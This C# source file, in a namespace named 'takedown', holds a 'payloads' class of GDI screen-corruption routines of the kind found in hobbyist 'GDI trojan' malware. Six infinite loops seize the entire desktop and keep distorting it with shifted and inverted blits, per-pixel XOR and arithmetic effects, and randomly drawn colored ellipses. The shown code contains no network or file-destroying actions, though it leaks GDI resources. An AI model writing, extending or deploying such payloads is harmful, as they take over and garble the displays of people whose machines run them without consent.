using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace takedown
{
    internal class payloads
    {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll")]
        public static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

        [DllImport("gdi32.dll")]
        public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

        [DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        public static extern bool SetStretchBltMode(IntPtr hdc, StretchMode iStretchMode);

        [DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject([In] IntPtr hObject);

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }

        [DllImport("msimg32.dll", EntryPoint = "AlphaBlend")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);

        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            public byte BlendOp;
            public byte BlendFlags;
            public byte SourceConstantAlpha;
            public byte AlphaFormat;
        }

        public const int AC_SRC_OVER = 0;

        public enum TernaryRasterOperations : uint
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062
        }

        [DllImport("user32.dll")]
        public static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

        public enum StretchMode
        {
            STRETCH_ANDSCANS = 1,
            STRETCH_ORSCANS = 2,
            STRETCH_DELETESCANS = 3,
            STRETCH_HALFTONE = 4,
        }

        [Flags]
        public enum RedrawWindowFlags : uint
        {
            Invalidate = 1u,
            InternalPaint = 2u,
            Erase = 4u,
            Validate = 8u,
            NoInternalPaint = 0x10u,
            NoErase = 0x20u,
            NoChildren = 0x40u,
            AllChildren = 0x80u,
            UpdateNow = 0x100u,
            EraseNow = 0x200u,
            Frame = 0x400u,
            NoFrame = 0x800u
        }

        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        public static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);

        [DllImport("shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        public static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);

        [DllImport("gdi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern IntPtr CreateEllipticRgn(int left, int top, int right, int bottom);

        [DllImport("gdi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern IntPtr CreatePolygonRgn(POINT[] lppt, int cPoints, int fnPolyFillMode);

        [DllImport("gdi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern IntPtr CreateRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

        [DllImport("gdi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        public static extern IntPtr CreateRoundRectRgn(int x1, int y1, int x2, int y2, int cx, int cy);

        [DllImport("gdi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InvertRgn(IntPtr hdc, IntPtr hrgn);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateSolidBrush(uint color);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateHatchBrush(int iHatch, uint color);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, uint istepIfAniCur, IntPtr hbrFlickerFreeDraw, uint diFlags);

        [DllImport("user32.dll")]
        public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct RGBQUAD
        {
            public byte rgbBlue;
            public byte rgbGreen;
            public byte rgbRed;
            public byte rgbReserved;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            /// <summary>
            /// A BITMAPINFOHEADER structure that contains information about the dimensions of color format.
            /// </summary>
            public BITMAPINFOHEADER bmiHeader;

            /// <summary>
            /// An array of RGBQUAD. The elements of the array that make up the color table.
            /// </summary>
            [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.Struct)]
            public RGBQUAD[] bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
            public uint biCompression;

            public void Init()
            {
                biSize = (uint)Marshal.SizeOf(this);
            }
        }

        [DllImport("gdi32.dll")]
        public static extern int SetDIBitsToDevice(IntPtr hdc, int XDest, int YDest, uint dwWidth, uint dwHeight, int XSrc, int YSrc, uint uStartScan, uint cScanLines, byte[] lpvBits, [In] ref BITMAPINFO lpbmi, uint fuColorUse);

        [DllImport("gdi32.dll")]
        public static extern IntPtr SetDIBits(IntPtr hdc, IntPtr hbm, uint start, uint line, int[] lpBits, [In] ref BITMAPINFO lpbmi, uint ColorUse);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool Rectangle(IntPtr hdc, int left, int top, int right, int bottom);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern int GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, byte[] lpvBits, ref BITMAPINFO lpbi, uint uUsage);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool Ellipse(IntPtr hdc, int left, int top, int right, int bottom);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool RoundRect(IntPtr hdc, int left, int top, int right, int bottom, int width, int height);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool MoveToEx(IntPtr hdc, int x, int y, IntPtr lpPoint);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool LineTo(IntPtr hdc, int x, int y);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool Polyline(IntPtr hdc, POINT[] lppt, int cPoints);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PolyBezier(IntPtr hdc, POINT[] lppt, int cPoints);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PolyBezierTo(IntPtr hdc, POINT[] lppt, int cPoints);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool Arc(IntPtr hdc, int left, int top, int right, int bottom, int xr1, int yr1, int xr2, int yr2);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool Chord(IntPtr hdc, int left, int top, int right, int bottom, int xr1, int yr1, int xr2, int yr2);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PolylineTo(IntPtr hdc, POINT[] lppt, int cCount);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PolyPolygon(IntPtr hdc, POINT[] lpPoints, int[] lpPolyCounts, int nCount);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PolyDraw(IntPtr hdc, POINT[] lppt, byte[] lpbTypes, int cCount);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool AngleArc(IntPtr hdc, int x, int y, uint r, float startAngle, float sweepAngle);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool ArcTo(IntPtr hdc, int left, int top, int right, int bottom, int xr1, int yr1, int xr2, int yr2);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool PolyPolyline(IntPtr hdc, POINT[] lppt, int[] lpdwPolyPoints, int cCount);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreatePolyPolygonRgn(POINT[] lppt, int[] lpPolyCounts, int nCount, int fnPolyFillMode);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateRectRgnIndirect(ref RECT lprc);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateEllipticRgnIndirect(ref RECT lprc);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr CreateRoundRectRgnIndirect(ref RECT lprc, int width, int height);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern IntPtr ExtCreateRegion(IntPtr lpXform, uint nCount, IntPtr lpRgnData);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern int CombineRgn(IntPtr hrgnDest, IntPtr hrgnSrc1, IntPtr hrgnSrc2, int fnCombineMode);

        [StructLayout(LayoutKind.Sequential)]
        public struct XFORM
        {
            public float eM11;
            public float eM12;
            public float eM21;
            public float eM22;
            public float eDx;
            public float eDy;
        }

        public const int GM_COMPATIBLE = 1;
        public const int GM_ADVANCED = 2;

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool SetWorldTransform(IntPtr hdc, ref XFORM lpXform);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool ModifyWorldTransform(IntPtr hdc, ref XFORM lpXform, int iMode);

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern int SetGraphicsMode(IntPtr hdc, int iMode);

        public static void GDIPayload1()
        {
            while (true)
            {
                Random r = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mdc = CreateCompatibleDC(hdc);
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;
                BITMAPINFO bmi = new BITMAPINFO();
                bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);
                bmi.bmiHeader.biWidth = w;
                bmi.bmiHeader.biHeight = h;
                bmi.bmiHeader.biPlanes = 1;
                bmi.bmiHeader.biBitCount = 32;
                bmi.bmiHeader.biCompression = 0;
                byte[] pixelData = new byte[w * h * 4];
                IntPtr screenBitmap = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mdc, screenBitmap);

                BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                GetDIBits(hdc, screenBitmap, 0, (uint)h, pixelData, ref bmi, 0);
                int animationFrame = 0;
                float cx1 = w * 0.3f;
                float cy1 = h * 0.3f;
                float cx2 = w * 0.7f;
                float cy2 = h * 0.4f;
                float cx3 = w * 0.9f;
                float cy3 = h * 0.75f;

                for (int y = 0; y < h; y++)
                {
                    for (int x = 0; x < w; x++)
                    {
                        int index = (y * w + x) * 4;

                        float dx1 = x - cx1;
                        float dy1 = y - cy1;
                        float d1 = (float)Math.Sqrt(dx1 * dx1 + dy1 * dy1);
                        float dx2 = x - cx2;
                        float dy2 = y - cy2;
                        float d2 = (float)Math.Sqrt(dx2 * dx2 + dy2 * dy2);

                        float dx3 = x - cx3;
                        float dy3 = y - cy3;
                        float d3 = (float)Math.Sqrt(dx3 * dx3 + dy3 * dy3);

                        float v = (float)Math.Sin(d1 * 0.04f + animationFrame * 0.08f) + (float)Math.Sin(d2 * 0.05f + animationFrame * 0.10f) + (float)Math.Sin(d3 * 0.03f + animationFrame * 0.06f);
                        byte c = (byte)(((v * 0.1666f) + 0.5f) * 255);

                        pixelData[index + 0] += (byte)(c + 255 + animationFrame);
                        pixelData[index + 1] += (byte)(c + 255 + animationFrame);
                        pixelData[index + 2] += (byte)(c + 255 + animationFrame);
                    }
                }

                animationFrame++;

                SetDIBitsToDevice(hdc, 0, 0, (uint)w, (uint)h, 0, 0, 0, (uint)h, pixelData, ref bmi, 0);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(screenBitmap);
                Thread.Sleep(r.Next(2000));
            }
        }

        public static void PreGDIPayload1()
        {
            while (true)
            {
                Random r = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;
                int rw = r.Next(w);
                int rh = r.Next(h);

                BitBlt(hdc, rw, r.Next(-12, 12), r.Next(600), h, hdc, rw, r.Next(-12, 12), TernaryRasterOperations.SRCCOPY);
                BitBlt(hdc, r.Next(-12, 12), rh, w, r.Next(600), hdc, r.Next(-12, 12), rh, TernaryRasterOperations.SRCCOPY);

                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }
        }

        public static void GDIPayload2()
        {
            while (true)
            {
                Random r = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;
                BitBlt(hdc, r.Next(-4, 4), r.Next(-4, 4), w, h, hdc, r.Next(-4, 4), r.Next(-4, 4), TernaryRasterOperations.SRCPAINT);
                BitBlt(hdc, r.Next(-4, 4), r.Next(-4, 4), w, h, hdc, r.Next(-4, 4), r.Next(-4, 4), TernaryRasterOperations.SRCAND);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }
        }

        public static void PreGDIPayload2()
        {
            while (true)
            {
                Random r = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;

                Point[] pos = new Point[5];
                int[] radiusX = new int[5];
                int[] radiusY = new int[5];
                int[] sizes = new int[5];
                IntPtr[] brushes = new IntPtr[5];

                for (int i = 0; i < 5; i++)
                {
                    pos[i] = new Point(r.Next(w), r.Next(h));
                    radiusX[i] = 100 + r.Next(400);
                    radiusY[i] = 100 + r.Next(400);
                    sizes[i] = 20 + r.Next(100);

                    int red = r.Next(256);
                    int green = r.Next(256);
                    int blue = r.Next(256);
                    brushes[i] = CreateSolidBrush((uint)(red | (green << 8) | (blue << 16)));
                }

                for (double angle = 0; angle < Math.PI * 2; angle += 0.05)
                {
                    for (int i = 0; i < 5; i++)
                    {
                        int dx = (int)(radiusX[i] * Math.Cos(angle));
                        int dy = (int)(radiusY[i] * Math.Sin(angle));
                        int x = pos[i].X + dx;
                        int y = pos[i].Y + dy;

                        SelectObject(hdc, brushes[i]);
                        Ellipse(hdc, x, y, x + sizes[i], y + sizes[i]);
                    }

                    Thread.Sleep(10);
                }

                for (int i = 0; i < 5; i++)
                {
                    DeleteObject(brushes[i]);
                }

                ReleaseDC(IntPtr.Zero, hdc);
                DeleteDC(hdc);
            }
        }

        public static void GDIPayload3()
        {
            while (true)
            {
                Random r = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mdc = CreateCompatibleDC(hdc);
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;
                BITMAPINFO bmi = new BITMAPINFO();
                bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);
                bmi.bmiHeader.biWidth = w;
                bmi.bmiHeader.biHeight = h;
                bmi.bmiHeader.biPlanes = 1;
                bmi.bmiHeader.biBitCount = 32;
                bmi.bmiHeader.biCompression = 0;
                byte[] pixelData = new byte[w * h * 4];
                IntPtr screenBitmap = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mdc, screenBitmap);

                BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                GetDIBits(hdc, screenBitmap, 0, (uint)h, pixelData, ref bmi, 0);
                int animationFrame = 0;

                for (int y = 0; y < h; y++)
                {
                    for (int x = 0; x < w; x++)
                    {
                        int index = (y * w + x) * 4;

                        pixelData[index + 0] += (byte)(x ^ y + animationFrame);
                        pixelData[index + 1] ^= (byte)(x & y + animationFrame);
                        pixelData[index + 2] *= (byte)(x + y + animationFrame);
                    }
                }

                animationFrame++;

                SetDIBitsToDevice(hdc, 0, 0, (uint)w, (uint)h, 0, 0, 0, (uint)h, pixelData, ref bmi, 0);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(screenBitmap);
                Thread.Sleep(r.Next(1000));
            }
        }

        public static void PreGDIPayload3()
        {
            while (true)
            {
                Random r = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;

                int r1 = r.Next(-w, w + w);
                int r2 = r.Next(-h, h + h);
                int r3 = r.Next(-w, w + w);
                int r4 = r.Next(-h, h + h);
                BitBlt(hdc, r1, r2, r3, r4, hdc, r1 + r.Next(-1, 2), r2 + r.Next(-1, 2), TernaryRasterOperations.SRCINVERT);
                BitBlt(hdc, r1, r2, r3, r4, hdc, r1 + r.Next(-1, 2), r2 + r.Next(-1, 2), TernaryRasterOperations.SRCERASE);

                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }
        }
    }
}